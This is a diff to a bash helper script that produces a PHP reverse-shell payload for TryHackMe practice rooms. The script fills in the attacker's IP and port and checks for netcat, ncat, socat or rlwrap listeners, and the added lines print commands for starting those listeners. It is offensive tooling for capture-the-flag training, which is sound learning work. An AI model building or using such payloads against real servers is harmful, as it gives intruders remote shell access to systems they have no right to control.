@@ -10,6 +10,7 @@ show_help() {
     echo "Description:"
     echo "make-rshell-php will generate a reverse PHP shell payload you can upload for TryHackMe rooms."
     echo "If you leave the listen address blank, it will automatically use your current IP address."
+    echo "It first checks /tmp/thmip.txt and falls back to using the system's IP."
     echo ""
     exit 0
 }
@@ -29,20 +30,20 @@ if [ -z "$IP_FROM_FILE" ]; then
 fi
 
 echo "Your IP address is: ${IP_FROM_FILE}"
-read -p "Enter listen address: " valueA
-read -p "Enter listen port: " valueB
+read -p "Enter listen address: " IP_ADDRESS
+read -p "Enter listen port: " PORT
 
-# Use the IP from the variable if valueA is left blank
-if [ -z "$valueA" ]; then
-    valueA=${IP_FROM_FILE}
-    if [ -z "$valueA" ]; then
+# Use the IP from the variable if IP_ADDRESS is left blank
+if [ -z "$IP_ADDRESS" ]; then
+    IP_ADDRESS=${IP_FROM_FILE}
+    if [ -z "$IP_ADDRESS" ]; then
         echo "Error: Unable to determine IP address. Please provide a valid listen address."
         exit 1
     fi
 fi
 
 # Check if the port is provided and is a number
-if ! [[ "$valueB" =~ ^[0-9]+$ ]]; then
+if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
     echo "Error: Listen port must be a valid number."
     exit 1
 fi
@@ -60,10 +61,31 @@ cp /tmp/Rshells/webshells/php-reverse-shell.php /tmp/rshell-payload.php || {
 }
 
 # Use sed to replace placeholders in the file
-sed -i "s/THM_ATTACKBOX_IP_HERE/${valueA}/" /tmp/rshell-payload.php
-sed -i "s/THM_ATTACKBOX_PORT_HERE/${valueB}/" /tmp/rshell-payload.php
+sed -i "s/THM_ATTACKBOX_IP_HERE/${IP_ADDRESS}/" /tmp/rshell-payload.php
+sed -i "s/THM_ATTACKBOX_PORT_HERE/${PORT}/" /tmp/rshell-payload.php
 
 # Finished output
 echo "Your payload has been created:"
 echo "/tmp/rshell-payload.php"
-echo "The payload's target is ${valueA}:${valueB}"
+echo "The payload's target is ${IP_ADDRESS}:${PORT}"
+echo ""
+
+# Check if any listeners are running on the specified port
+echo "Checking for active listeners on port ${PORT}..."
+if netstat -tuln | grep -q ":${PORT}" && (pgrep -x nc || pgrep -x ncat || pgrep -x socat || pgrep -x rlwrap); then
+    echo "A listener is detected on port ${PORT}."
+else
+    echo "No listeners detected on port ${PORT}!"
+    echo "Don't forget to set up a listener. Here are some commands you can use:"
+    echo ""
+    echo "Rlwrap:"
+    echo " $ rlwrap nc -lvnp ${PORT} # Enhancing Netcat Shell with Rlwrap to use GNU readline allowing editing keyboard and history."
+    echo ""
+    echo "Ncat:"
+    echo " $ ncat -lvnp ${PORT} # Listening for Reverse Shells"
+    echo " $ ncat --ssl -lvnp ${PORT} # Listening for Reverse Shells with SSL"
+    echo ""
+    echo "Socat:"
+    echo " $ socat -d -d TCP-LISTEN:${PORT} STDOUT # Creates socket connection between two data sources and/or hosts."
+    echo ""
+fi
